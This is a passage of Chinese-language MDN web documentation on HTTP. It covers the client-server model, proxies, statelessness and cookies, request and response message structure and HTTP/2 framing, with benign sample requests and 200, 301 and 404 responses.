不同于以往，浏览器历史记录将考虑非 www 和 www 的网址作为独立的条目。

## [使你页面都有效](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Choosing_between_www_and_non-www_URLs#使你页面都有效)

有了这些技术，你可以配置服务器对www前缀和非www前缀的域名进行正确的响应，如果你无法预测用户会在浏览器地址栏使用哪个URL，你需要做的就是选择一个作为你的规范地址，然后重定向另一个。

----

# HTTP 基础

## HTTP概述

HTTP是一种能够获取如 HTML 这样的网络资源的 [protocol](https://developer.mozilla.org/zh-CN/docs/Glossary/Protocol)(通讯协议)。它是在 Web 上进行数据交换的基础，是一种 **client-server 协议**，也就是说，请求通常是由像浏览器这样的接受方发起的。一个完整的Web文档通常是由不同的子文档拼接而成的，像是文本、布局描述、图片、视频、脚本等等。

![A Web document is the composition of different resources](https://mdn.mozillademos.org/files/13677/Fetching_a_page.png)

客户端和服务端通过交换各自的消息（与数据流正好相反）进行交互。由像浏览器这样的客户端发出的消息叫做 *requests*，被服务端响应的消息叫做 *responses。*

![HTTP as an application layer protocol, on top of TCP (transport layer) and IP (network layer) and below the presentation layer.](https://mdn.mozillademos.org/files/13673/HTTP%20&%20layers.png)HTTP被设计于20世纪90年代初期，是一种可扩展的协议。它是应用层的协议，通过[TCP](https://developer.mozilla.org/zh-CN/docs/Glossary/TCP)，或者是[TLS](https://developer.mozilla.org/zh-CN/docs/Glossary/TLS)－加密的TCP连接来发送，理论上任何可靠的传输协议都可以使用。因为其良好的扩展性，时至今日，它不仅被用来传输超文本文档，还用来传输图片、视频或者向服务器发送如HTML表单这样的信息。HTTP还可以根据网页需求，仅获取部分Web文档内容更新网页。

---

## [基于HTTP的组件系统](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#基于http的组件系统)

HTTP是一个client-server协议：请求通过一个实体被发出，实体也就是用户代理。大多数情况下，这个用户代理都是指浏览器，当然它也可能是任何东西，比如一个爬取网页生成维护搜索引擎索引的机器爬虫。

每一个发送到服务器的请求，都会被服务器处理并返回一个消息，也就是*response*。在这个请求与响应之间，还有许许多多的被称为 [proxies](https://developer.mozilla.org/zh-CN/docs/Glossary/Proxy_server) 的实体，他们的作用与表现各不相同，比如有些是网关，还有些是[caches](https://developer.mozilla.org/zh-CN/docs/Glossary/Cache)等。

![img](https://mdn.mozillademos.org/files/13679/Client-server-chain.png)

实际上，在一个浏览器和处理请求的服务器之间，还有路由器、调制解调器等许多计算机。由于Web的层次设计，那些在网络层和传输层的细节都被隐藏起来了。HTTP位于最上层的应用层。虽然底层对于分析网络问题非常重要，但是大多都跟对HTTP的描述不相干。

### [客户端：user-agent](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#客户端：user-agent)

user-agent 就是任何能够为用户发起行为的工具。这个角色通常都是由浏览器来扮演。一些例外情况，比如是工程师使用的程序，以及Web开发人员调试应用程序。

浏览器**总是**作为发起一个请求的实体，他永远不是服务器（虽然近几年已经出现一些机制能够模拟由服务器发起的请求消息了）。

要展现一个网页，浏览器首先发送一个请求来获取页面的HTML文档，再解析文档中的资源信息发送其他请求，获取可执行脚本或CSS样式来进行页面布局渲染，以及一些其它页面资源（如图片和视频等）。然后，浏览器将这些资源整合到一起，展现出一个完整的文档，也就是网页。浏览器执行的脚本可以在之后的阶段获取更多资源，并相应地更新网页。

一个网页就是一个超文本文档。也就是说，有一部分显示的文本可能是链接，启动它（通常是鼠标的点击）就可以获取一个新的网页，使得用户可以控制客户端进行网上冲浪。浏览器来负责发送HTTP请求，并进一步解析HTTP返回的消息，以向用户提供明确的响应。

### [Web服务端](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#web服务端)

在上述通信过程的另一端，是由Web Server来*服务*并提供客户端所请求的文档。Server只是虚拟意义上代表一个机器：它可以是共享负载（负载均衡）的一组服务器组成的计算机集群，也可以是一种复杂的软件，通过向其他计算机（如缓存，数据库服务器，电子商务服务器 ...）发起请求来获取部分或全部资源。

Server 不一定是一台机器，但一个机器上可以装载的众多Servers。在HTTP/1.1 和[`Host`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Host)头部中，它们甚至可以共享同一个IP地址。

### [代理（Proxies）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#代理（proxies）)

在浏览器和服务器之间，有许多计算机和其他设备转发了HTTP消息。由于Web栈层次结构的原因，它们大多都出现在传输层、网络层和物理层上，对于HTTP应用层而言就是透明的，虽然它们可能会对应用层性能有重要影响。还有一部分是表现在应用层上的，被称为**代理（Proxies）**。代理（Proxies）既可以表现得透明，又可以不透明（“改变请求”会通过它们）。代理主要有如下几种作用：

- 缓存（可以是公开的也可以是私有的，像浏览器的缓存）
- 过滤（像反病毒扫描，家长控制...）
- 负载均衡（让多个服务器服务不同的请求）
- 认证（对不同资源进行权限管理）
- 日志记录（允许存储历史信息）

---

## [HTTP 的基本性质](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_的基本性质)

### [HTTP 是简单的](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_是简单的)

虽然下一代HTTP/2协议将HTTP消息封装到了帧（frames）中，HTTP大体上还是被设计得简单易读。HTTP报文能够被人读懂，还允许简单测试，降低了门槛，对新人很友好。

### [HTTP 是可扩展的](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_是可扩展的)

在 HTTP/1.0 中出现的 [HTTP headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers) 让协议扩展变得非常容易。只要服务端和客户端就新 headers 达成语义一致，新功能就可以被轻松加入进来。

### [HTTP 是无状态，有会话的](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_是无状态，有会话的)

HTTP是无状态的：在同一个连接中，两个执行成功的请求之间是没有关系的。这就带来了一个问题，用户没有办法在同一个网站中进行连续的交互，比如在一个电商网站里，用户把某个商品加入到购物车，切换一个页面后再次添加了商品，这两次添加商品的请求之间没有关联，浏览器无法知道用户最终选择了哪些商品。而使用HTTP的头部扩展，HTTP Cookies就可以解决这个问题。把Cookies添加到头部中，创建一个会话让每次请求都能共享相同的上下文信息，达成相同的状态。

注意，HTTP本质是无状态的，**使用Cookies可以创建有状态的会话**。

---

### [HTTP 和连接](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_和连接)

一个连接是由传输层来控制的，这从根本上不属于HTTP的范围。HTTP并不需要其底层的传输层协议是面向连接的，只需要它是可靠的，或不丢失消息的（至少返回错误）。在互联网中，有两个最常用的传输层协议：TCP是可靠的，而UDP不是。因此，**HTTP依赖于面向连接的TCP进行消息传递，但连接并不是必须的。**

在客户端（通常指浏览器）与服务器能够交互（客户端发起请求，服务器返回响应）之前，必须在这两者间建立一个 TCP 链接，打开一个 TCP 连接需要多次往返交换消息（因此耗时）。HTTP/1.0 默认为每一对 HTTP 请求/响应都打开一个单独的 TCP 连接。当需要连续发起多个请求时，这种模式比多个请求共享同一个 TCP 链接更低效。

为了减轻这些缺陷，HTTP/1.1引入了流水线（被证明难以实现）和持久连接的概念：底层的TCP连接可以通过[`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection)头部来被部分控制。HTTP/2则发展得更远，通过在一个连接复用消息的方式来让这个连接始终保持为暖连接。 

为了更好的适合HTTP，设计一种更好传输协议的进程一直在进行。Google就研发了一种以UDP为基础，能提供更可靠更高效的传输协议[QUIC](https://en.wikipedia.org/wiki/QUIC)。

---

## [HTTP 能控制什么](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_能控制什么)

多年以来，HTTP良好的扩展性使得越来越多的Web功能归其控制。缓存和认证很早就可以由HTTP来控制了。另一方面，对同源同域的限制到2010年才有所改变。

以下是可以被HTTP控制的常见特性。

- [缓存 ](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching)
  文档如何缓存能通过HTTP来控制。服务端能告诉代理和客户端哪些文档需要被缓存，缓存多久，而客户端也能够命令中间的缓存代理来忽略存储的文档。
- *开放同源限制*
  为了防止网络窥听和其它隐私泄漏，浏览器强制对Web网站做了分割限制。只有来自于**相同来源**的网页才能够获取网站的全部信息。这样的限制有时反而成了负担，HTTP可以通过修改头部来开放这样的限制，因此Web文档可以是由不同域下的信息拼接成的（某些情况下，这样做还有安全因素考虑）。
- *认证*
  一些页面能够被保护起来，仅让特定的用户进行访问。基本的认证功能可以直接通过HTTP提供，使用[`Authenticate`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Authenticate)相似的头部即可，或用HTTP Cookies来设置指定的会话。
- *[代理和隧道](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Proxy_servers_and_tunneling)*
  通常情况下，服务器和/或客户端是处于内网的，对外网隐藏真实 IP 地址。因此 HTTP 请求就要通过代理越过这个网络屏障。但并非所有的代理都是 HTTP 代理。例如，SOCKS协议的代理就运作在更底层，一些像 FTP 这样的协议也能够被它们处理。
- *会话* 
  使用HTTP Cookies允许你用一个服务端的状态发起请求，这就创建了会话。虽然基本的HTTP是无状态协议。这很有用，不仅是因为这能应用到像购物车这样的电商业务上，更是因为这使得任何网站都能轻松为用户定制展示内容了。

----

## [HTTP 流](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_流)

当客户端想要和服务端进行信息交互时（服务端是指最终服务器，或者是一个中间代理），过程表现为下面几步：

1. 打开一个TCP连接：TCP连接被用来发送一条或多条请求，以及接受响应消息。客户端可能打开一条新的连接，或重用一个已经存在的连接，或者也可能开几个新的TCP连接连向服务端。

2. 发送一个HTTP报文：HTTP报文（在HTTP/2之前）是语义可读的。在HTTP/2中，这些简单的消息被封装在了帧中，这使得报文不能被直接读取，但是原理仍是相同的。

   ```http
   GET / HTTP/1.1
   Host: developer.mozilla.org
   Accept-Language: fr
   ```

3. 读取服务端返回的报文信息：

   ```http
   HTTP/1.1 200 OK
   Date: Sat, 09 Oct 2010 14:28:02 GMT
   Server: Apache
   Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
   ETag: "51142bc1-7449-479b075b2891b"
   Accept-Ranges: bytes
   Content-Length: 29769
   Content-Type: text/html
   
   <!DOCTYPE html... (here comes the 29769 bytes of the requested web page)
   ```

4. 关闭连接或者为后续请求重用连接。

当HTTP流水线启动时，后续请求都可以不用等待第一个请求的成功响应就被发送。然而HTTP流水线已被证明很难在现有的网络中实现，因为现有网络中有很多老旧的软件与现代版本的软件共存。因此，HTTP流水线已被在有多请求下表现得更稳健的HTTP/2的帧所取代。

---

## [HTTP 报文](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_报文)

HTTP/1.1以及更早的HTTP协议报文都是语义可读的。在HTTP/2中，这些报文被嵌入到了一个新的二进制结构，帧。帧允许实现很多优化，比如报文头部的压缩和复用。即使只有原始HTTP报文的一部分以HTTP/2发送出来，每条报文的语义依旧不变，客户端会重组原始HTTP/1.1请求。因此用HTTP/1.1格式来理解HTTP/2报文仍旧有效。

有两种HTTP报文的类型，请求与响应，每种都有其特定的格式。

### [请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#请求)

HTTP请求的一个例子：

![A basic HTTP request](https://mdn.mozillademos.org/files/13687/HTTP_Request.png)

请求由以下元素组成：

- 一个HTTP的[method](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)，经常是由一个动词像[`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET), [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST) 或者一个名词像[`OPTIONS`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS)，[`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD)来定义客户端的动作行为。通常客户端的操作都是获取资源（GET方法）或者发送[HTML form](https://developer.mozilla.org/zh-CN/docs/Learn/Forms)表单（POST方法），虽然在一些情况下也会有其他操作。
- 要获取的资源的路径，通常是上下文中就很明显的元素资源的URL，它没有[protocol](https://developer.mozilla.org/zh-CN/docs/Glossary/Protocol) （`http://`），[domain](https://developer.mozilla.org/zh-CN/docs/Glossary/Domain)（`developer.mozilla.org`），或是TCP的[port (en-US)](https://developer.mozilla.org/en-US/docs/Glossary/Port)（HTTP一般在80端口）。
- HTTP协议版本号。
- 为服务端表达其他信息的可选头部[headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)。
- 对于一些像POST这样的方法，报文的body就包含了发送的资源，这与响应报文的body类似。

### [响应](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#响应)

HTTP响应的一个例子：

![img](https://mdn.mozillademos.org/files/13691/HTTP_Response.png)

响应报文包含了下面的元素：

- HTTP协议版本号。
- 一个状态码（[status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)），来告知对应请求执行成功或失败，以及失败的原因。
- 一个状态信息，这个信息是非权威的状态码描述信息，可以由服务端自行设定。
- HTTP [headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)，与请求头部类似。
- 可选项，比起请求报文，响应报文中更常见地包含获取的资源body。

---

## [基于HTTP的APIs](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#基于http的apis)


基于HTTP的最常用API是[`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) API，可用于在[user agent](https://developer.mozilla.org/zh-CN/docs/Glossary/User_agent)和服务器之间交换数据。 现代[`Fetch API`](https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API)提供相同的功能，具有更强大和灵活的功能集。

另一种API，即服务器发送的事件，是一种单向服务，允许服务器使用HTTP作为传输机制向客户端发送事件。 使用[`EventSource`](https://developer.mozilla.org/zh-CN/docs/Web/API/EventSource)接口，客户端打开连接并建立事件句柄。 客户端浏览器自动将到达HTTP流的消息转换为适当的[`Event`](https://developer.mozilla.org/zh-CN/docs/Web/API/Event)对象，并将它们传递给专门处理这类[`type`](https://developer.mozilla.org/zh-CN/docs/Web/API/Event/type)事件的句柄，如果有这么个句柄的话。但如果相应的事件处理句柄根本没有建立，那就交给[`onmessage` (en-US)](https://developer.mozilla.org/en-US/docs/Web/API/EventSource/message_event)事件处理程序处理。

---

# HTTP消息

HTTP消息是服务器和客户端之间交换数据的方式。有两种类型的消息︰ 请求（requests）--由客户端发送用来触发一个服务器上的动作；响应（responses）--来自服务器的应答。

HTTP消息由采用ASCII编码的多行文本构成。在HTTP/1.1及早期版本中，这些消息通过连接公开地发送。在HTTP/2中，为了优化和性能方面的改进，曾经可人工阅读的消息被分到多个HTTP帧中。

Web 开发人员或网站管理员，很少自己手工创建这些原始的HTTP消息︰ 由软件、浏览器、 代理或服务器完成。他们通过配置文件（用于代理服务器或服务器），API （用于浏览器）或其他接口提供HTTP消息。

![From a user-, script-, or server- generated event, an HTTP/1.x msg is generated, and if HTTP/2 is in use, it is binary framed into an HTTP/2 stream, then sent.](https://mdn.mozillademos.org/files/13825/HTTPMsg2.png)

HTTP/2二进制框架机制被设计为不需要改动任何API或配置文件即可应用︰ 它大体上对用户是透明的。

HTTP 请求和响应具有相似的结构，由以下部分组成︰

1. 一行起始行用于描述要执行的请求，或者是对应的状态，成功或失败。这个起始行总是单行的。
2. 一个可选的HTTP头集合指明请求或描述消息正文。
3. 一个空行指示所有关于请求的元数据已经发送完毕。
4. 一个可选的包含请求相关数据的正文 (比如HTML表单内容), 或者响应相关的文档。 正文的大小有起始行的HTTP头来指定。

起始行和 HTTP 消息中的HTTP 头统称为**请求头**，而其有效负载被称为**消息正文**。

![Requests and responses share a common structure in HTTP](https://mdn.mozillademos.org/files/13827/HTTPMsgStructure2.png)

---

## [HTTP 请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#http_请求)

### [起始行](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#起始行)

HTTP请求是由客户端发出的消息，用来使服务器执行动作。*起始行 (start-line)* 包含三个元素：

1. 一个 *[HTTP 方法](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)*，一个动词 (像 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET), [`PUT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT) 或者 [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST)) 或者一个名词 (像 [`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD) 或者 [`OPTIONS`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS)), 描述要执行的动作. 例如, `GET` 表示要获取资源，`POST` 表示向服务器推送数据 (创建或修改资源, 或者产生要返回的临时文件)。

2. 请求目标 (request target)，

   通常是一个

    

   URL

   ，或者是协议、端口和域名的绝对路径，通常以请求的环境为特征。请求的格式因不同的 HTTP 方法而异。它可以是：

   - 一个绝对路径，末尾跟上一个 ' ? ' 和查询字符串。这是最常见的形式，称为 *原始形式 (origin form)*，被 GET，POST，HEAD 和 OPTIONS 方法所使用。
     `POST / HTTP/1.1GET /background.png HTTP/1.0HEAD /test.html?query=alibaba HTTP/1.1OPTIONS /anypage.html HTTP/1.0`
   - 一个完整的URL，被称为 *绝对形式 (absolute form)*，主要在使用 `GET` 方法连接到代理时使用。
     `GET http://developer.mozilla.org/en-US/docs/Web/HTTP/Messages HTTP/1.1`
   - 由域名和可选端口（以`':'`为前缀）组成的 URL 的 authority component，称为 *authority form*。 仅在使用 `CONNECT` 建立 HTTP 隧道时才使用。
     `CONNECT developer.mozilla.org:80 HTTP/1.1`
   - *星号形式 (asterisk form)*，一个简单的星号(`'*'`)，配合 `OPTIONS` 方法使用，代表整个服务器。
     `OPTIONS * HTTP/1.1`

3. *HTTP 版本 (HTTP version*)*，*定义了剩余报文的结构，作为对期望的响应版本的指示符。

### [Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#headers)

来自请求的 [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) 遵循和 HTTP header 相同的基本结构：不区分大小写的字符串，紧跟着的冒号 `(':')` 和一个结构取决于 header 的值。 整个 header（包括值）由一行组成，这一行可以相当长。

有许多请求头可用，它们可以分为几组：

- *General headers，*例如 [`Via`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via)，适用于整个报文。
- *Request headers，*例如 [`User-Agent`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent)，[`Accept-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Type)，通过进一步的定义(例如 [`Accept-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language))，或者给定上下文(例如 [`Referer`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer))，或者进行有条件的限制 (例如 [`If-None`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None)) 来修改请求。
- *Entity headers，*例如 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length)，适用于请求的 body。显然，如果请求中没有任何 body，则不会发送这样的头文件。

![Example of headers in an HTTP request](https://mdn.mozillademos.org/files/13821/HTTP_Request_Headers2.png)

### [Body](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#body)

请求的最后一部分是它的 body。不是所有的请求都有一个 body：例如获取资源的请求，GET，HEAD，DELETE 和 OPTIONS，通常它们不需要 body。 有些请求将数据发送到服务器以便更新数据：常见的的情况是 POST 请求（包含 HTML 表单数据）。

Body 大致可分为两类：

- Single-resource bodies，由一个单文件组成。该类型 body 由两个 header 定义： [`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) 和 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length).
- [Multiple-resource bodies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#multipartform-data)，由多部分 body 组成，每一部分包含不同的信息位。通常是和  [HTML Forms](https://developer.mozilla.org/en-US/docs/Learn/Forms) 连系在一起。

---

## [HTTP 响应](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#http_响应)

### [状态行](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#状态行)

HTTP 响应的起始行被称作 *状态行* *(status line)*，包含以下信息：

1. *协议版本*，通常为 `HTTP/1.1。`
2. *状态码 (**status code)*，表明请求是成功或失败。常见的状态码是 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200)，[`404`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404)，或 [`302`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302)。
3. *状态文本 (status text)*。一个简短的，纯粹的信息，通过状态码的文本描述，帮助人们理解该 HTTP 消息。

一个典型的状态行看起来像这样：`HTTP/1.1 404 Not Found`。

### [Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#headers_2)

响应的  [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) 遵循和任何其它 header 相同的结构：不区分大小写的字符串，紧跟着的冒号 (`':'`) 和一个结构取决于 header 类型的值。 整个 header（包括其值）表现为单行形式。

有许多响应头可用，这些响应头可以分为几组：

- *General headers，*例如 [`Via`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via)，适用于整个报文。
- *Response headers，*例如 [`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) 和 [`Accept-Ranges`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges)，提供其它不符合状态行的关于服务器的信息。
- *Entity headers*，例如 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length)，适用于请求的 body。显然，如果请求中没有任何 body，则不会发送这样的头文件。

![Example of headers in an HTTP response](https://mdn.mozillademos.org/files/13823/HTTP_Response_Headers2.png)

### [Body](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#body_2)

响应的最后一部分是 body。不是所有的响应都有 body：具有状态码 (如 [`201`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/201) 或 [`204`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/204)) 的响应，通常不会有 body。

Body 大致可分为三类：

- Single-resource bodies，由**已知**长度的单个文件组成。该类型 body 由两个 header 定义：[`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) 和 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length)。
- Single-resource bodies，由**未知**长度的单个文件组成，通过将 [`Transfer-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding) 设置为 `chunked `来使用 chunks 编码。
- [Multiple-resource bodies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#multipartform-data)，由多部分 body 组成，每部分包含不同的信息段。但这是比较少见的。

---

## [HTTP/2 帧](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#http2_帧)

HTTP/1.x 报文有一些性能上的缺点：

- Header 不像 body，它不会被压缩。
- 两个报文之间的 header 通常非常相似，但它们仍然在连接中重复传输。
- 无法复用。当在同一个服务器打开几个连接时：TCP 热连接比冷连接更加有效。

HTTP/2 引入了一个额外的步骤：它将 HTTP/1.x 消息分成帧并嵌入到流 (stream) 中。数据帧和报头帧分离，这将允许报头压缩。将多个流组合，这是一个被称为 *多路复用 (multiplexing)* 的过程，它允许更有效的底层 TCP 连接。

![HTTP/2 modify the HTTP message to divide them in frames (part of a single stream), allowing for more optimization.](https://mdn.mozillademos.org/files/13819/Binary_framing2.png)

HTTP 帧现在对 Web 开发人员是透明的。在 HTTP/2 中，这是一个在  HTTP/1.1 和底层传输协议之间附加的步骤。Web 开发人员不需要在其使用的 API 中做任何更改来利用 HTTP 帧；当浏览器和服务器都可用时，HTTP/2 将被打开并使用。

---

# 典型的 HTTP 会话

在像 HTTP 这样的Client-Server（客户端-服务器）协议中，会话分为三个阶段：

1. 客户端建立一条 TCP 连接（如果传输层不是 TCP，也可以是其他适合的连接）。
2. 客户端发送请求并等待应答。
3. 服务器处理请求并送回应答，回应包括一个状态码和对应的数据。

从 HTTP/1.1 开始，连接在完成第三阶段后不再关闭，客户端可以再次发起新的请求。这意味着第二步和第三步可以连续进行数次。

---

## [建立连接](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session#建立连接)

在客户端-服务器协议中，连接是由客户端发起建立的。在HTTP中打开连接意味着在底层传输层启动连接，通常是 TCP。

使用 TCP 时，HTTP 服务器的默认端口号是 80，另外还有 8000 和 8080 也很常用。页面的 URL 会包含域名和端口号，但当端口号为 80 时可以省略。前往 [标识互联网上的内容](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web) 获取更多内容。

> **注意:** 客户端-服务器模型不允许服务器在没有显式请求时发送数据给客户端。为了解决这个问题，Web 开发者们使用了许多技术：例如，使用 [`XMLHTTPRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [`Fetch`](https://developer.mozilla.org/zh-CN/docs/Web/API/fetch) API 周期性地请求服务器，使用 HTML [WebSockets API](https://developer.mozilla.org/en-US/WebSockets)，或其他类似协议。

---

## [发送客户端请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session#发送客户端请求)

一旦连接建立，用户代理就可以发送请求 (用户代理通常是 Web 浏览器，但也可以是其他的（例如爬虫）。客户端请求由一系列文本指令组成，并使用 CRLF 分隔，它们被划分为三个块：

1. 第一行包括请求方法及请求参数：
   - 文档路径，不包括协议和域名的绝对路径 URL
   - 使用的 HTTP 协议版本
2. 接下来的行每一行都表示一个 HTTP 首部，为服务器提供关于所需数据的信息（例如语言，或 MIME 类型），或是一些改变请求行为的数据（例如当数据已经被缓存，就不再应答）。这些 HTTP 首部组成以一个空行结束的一个块。
3. 最后一块是可选数据块，包含更多数据，主要被 POST 方法所使用。

---

### [请求示例](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session#请求示例)

访问 developer.mozilla.org 的根页面，即 [http://developer.mozilla.org/](https://developer.mozilla.org/)，并告诉服务器用户代理倾向于该页面使用法语展示：

```http
GET / HTTP/1.1
Host: developer.mozilla.org
Accept-Language: fr
```

注意最后的空行，它把首部与数据块分隔开。由于在 HTTP 首部中没有 `Content-Length`，数据块是空的，所以服务器可以在收到代表首部结束的空行后就开始处理请求。

例如，发送表单的结果：

```http
POST /contact_form.php HTTP/1.1
Host: developer.mozilla.org
Content-Length: 64
Content-Type: application/x-www-form-urlencoded

name=Joe%20User&request=Send%20me%20one%20of%20your%20catalogue
```

### [请求方法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session#请求方法)

HTTP 定义了一组 [请求方法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods) 用来指定对目标资源的行为。它们一般是名词，但这些请求方法有时会被叫做 HTTP 动词。最常用的请求方法是 `GET` 和 `POST`：

- [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法请求指定的资源。`GET` 请求应该只被用于获取数据。
- [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST) 方法向服务器发送数据，因此会改变服务器状态。这个方法常在 [HTML 表单](https://developer.mozilla.org/en-US/docs/Learn/Forms) 中使用。

---

## [服务器响应结构](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session#服务器响应结构)

当收到用户代理发送的请求后，Web 服务器就会处理它，并最终送回一个响应。与客户端请求很类似，服务器响应由一系列文本指令组成, 并使用 CRLF 分隔，它们被划分为三个不同的块：

1. 第一行是 *`状态行`，*包括使用的 HTTP 协议版本，状态码和一个状态描述（可读描述文本）。
2. 接下来每一行都表示一个 HTTP 首部，为客户端提供关于所发送数据的一些信息（如类型，数据大小，使用的压缩算法，缓存指示）。与客户端请求的头部块类似，这些 HTTP 首部组成一个块，并以一个空行结束。
3. 最后一块是数据块，包含了响应的数据 （如果有的话）。

### [响应示例](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session#响应示例)

成功的网页响应：

```http
HTTP/1.1 200 OK
Date: Sat, 09 Oct 2010 14:28:02 GMT
Server: Apache
Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
ETag: "51142bc1-7449-479b075b2891b"
Accept-Ranges: bytes
Content-Length: 29769
Content-Type: text/html

<!DOCTYPE html... (这里是 29769 字节的网页HTML源代码)
```

请求资源已被永久移动的网页响应：

```http
HTTP/1.1 301 Moved Permanently
Server: Apache/2.2.3 (Red Hat)
Content-Type: text/html; charset=iso-8859-1
Date: Sat, 09 Oct 2010 14:30:24 GMT
Location: https://developer.mozilla.org/ (目标资源的新地址, 服务器期望用户代理去访问它)
Keep-Alive: timeout=15, max=98
Accept-Ranges: bytes
Via: Moz-Cache-zlb05
Connection: Keep-Alive
X-Cache-Info: caching
X-Cache-Info: caching
Content-Length: 325 (如果用户代理无法转到新地址，就显示一个默认页面)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="https://developer.mozilla.org/">here</a>.</p>
<hr>
<address>Apache/2.2.3 (Red Hat) Server at developer.mozilla.org Port 80</address>
</body></html>
```

请求资源不存在的网页响应：

```http
HTTP/1.1 404 Not Found
Date: Sat, 09 Oct 2010 14:33:02 GMT
Server: Apache
Last-Modified: Tue, 01 May 2007 14:24:39 GMT
ETag: "499fd34e-29ec-42f695ca96761;48fe7523cfcc1"
Accept-Ranges: bytes
Content-Length: 10732
Content-Type: text/html

